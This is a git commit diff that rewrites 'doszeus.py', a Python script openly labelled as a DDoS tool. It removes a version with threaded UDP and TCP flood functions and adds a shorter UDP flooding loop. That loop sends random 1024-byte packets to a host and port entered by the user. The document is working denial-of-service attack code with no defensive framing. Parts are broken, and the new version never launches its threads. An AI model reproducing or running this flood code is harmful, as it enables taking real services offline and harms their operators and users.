146eeb7fee67cf260e41ac2fa98c985da2a3885d
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-08 22:21:31 +0300

    Update doszeus.py

--- doszeus.py
+++ doszeus.py
@@ -1,4 +1,4 @@
-#good script by OhMyXyden
+#good script by ded
 import signal
 import time
 import socket
@@ -8,183 +8,24 @@ import sys
 import os
 from os import system, name
 
-os.system("clear")
-print("\033[1;34;40m \n")
-os.system("figlet DDOS ATTACK -f slant")
-print("\033[1;33;40m If you have any issue post a thread on https://github.com/XaviFortes/Python-UDP-Flood/issues\n")
-os.system("clear")
-print("\033[1;34;40m Tools Ddos By : OhMyXyden\n" )
-
-print("\033[0;31;40m 🅃🄾🄾🄻🅂 🄸🄽🄸 🄳🄸🄱🅄🄰🅃 🄾🄻🄴🄷 🄾🄷🄼🅈🅇🅈🄳🄴🄽\n") 
-
-print(" > PASSWORD : OhMyXyden ") 
-
-OhMyXyden = input()
-
-if OhMyXyden == "n":
-
-exit(0)ip = str(input(" HOST/IP: => "))
-
-port = int(input(" PORT: => "))
-
-choice = str(input(" Yuk Mari Kita DDOS Sayang?(y/n): => "))
-
-times = int(input(" PACKETS/Time: => "))
-
-threads = int(input(" ISI PACKETS/Потоки: => "))
-
+print("###########################")
+print("###### TCP/UDP FLOOD ######")
+print("###########################")
+ip = str(input(" HOST/IP:=> "))
+port = int(input(" PORT:=> "))
+choice = str(input(" UDP(Y/N):=> "))	
+times = int(input(" PACKETS/Time:=> "))
+threads = int(input(" THREADS/Потоки:=> "))
 def run():
-
-	data = random._urandom(811)
-
-	i = random.choice(("[ASSSALAMMUALAKUM]","[ASSSALAMMUALAKUM]","[ASSSALAMMUALAKUM]"))
-
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
 	while True:
-
 		try:
-
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #It's using the UDP method as you can see in SOCK_DGRAM
-
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
-
 			for x in range(times):
-
 				s.sendto(data,addr)
-
-			print(i +" DDOS BY OHMYXYDEN!!!")
-
+			print(i +" ATTACK!!!")
 		except:
-
-			s.close()
-
-			print("[!] SERVER DOWN!!!")
-
-def run2():
-
-	data = random._urandom(811)
-
-	i = random.choice(("[ASSSALAMMUALAKUM]","[ASSSALAMMUALAKUM]","[ASSSALAMMUALAKUM]"))
-
-	while True:
-
-		try:
-
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #And here it's using the TCP method as you can see in SOCK_STREAM
-
-			s.connect((ip,port))
-
-			s.send(data)
-
-			for x in range(times):
-
-				s.send(data)
-
-			print(i +" DDOS BY OHMYXYDEN!!!")
-
-		except:
-
-			s.close()
-
-			print("[*] SERVER DOWN!!!")
-
-for y in range(threads):
-
-	if choice == 'y':
-
-		th = threading.Thread(target = run)
-
-		th.start()
-
-	else:
-
-		th = threading.Thread(target = run2)
-
-		th.start()
-
-def new():
-
-	for y in range(threads):
-
-		if choice == 'y':
-
-			th = threading.Thread(target = run)
-
-			th.start()
-
-		else:
-
-			th = threading.Thread(target = run2)
-
-			th.start()
-
-def whereuwere():
-
-    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
-
-    print("Put 1 for UDP and 2 for TCP")
-
-    whereman = str(input(" 1 or 2 >:("))
-
-    if whereman == '1':
-
-        run()
-
-    else:
-
-        run2()
-
-def clear():
-
-	# for windows
-
-    if name == 'nt':
-
-        _ = system('cls')
-
-    # for mac and linux(here, os.name is 'posix')
-
-    else:
-
-        _ = system('clear')
-
-def byebye():
-
-	clear()
-
-	os.system("figlet Youre Leaving Sir -f slant")
-
-	sys.exit(130)
-
-def exit_gracefully(signum, frame):
-
-    # restore the original signal handler as otherwise evil things will happen
-
-    # in raw_input when CTRL+C is pressed, and our signal handler is not re-entrant
-
-    signal.signal(signal.SIGINT, original_sigint)
-
-    try:
-
-        exitc = str(input(" Ngapain Close Lagi Lah <3 ?:"))
-
-        if exitc == 'y':
-
-            byebye()
-
-    except KeyboardInterrupt:
-
-        print("Ok ok, quitting")
-
-        byebye()
-
-    # restore the exit gracefully handler here
-
-    signal.signal(signal.SIGINT, exit_gracefully)
-
-if __name__ == '__main__':
-
-    # store the original SIGINT handler
-
-    original_sigint = signal.getsignal(signal.SIGINT)
-
-    signal.signal(signal.SIGINT, exit_gracefully)
+			print("[!] ATTACK!!!")
+			
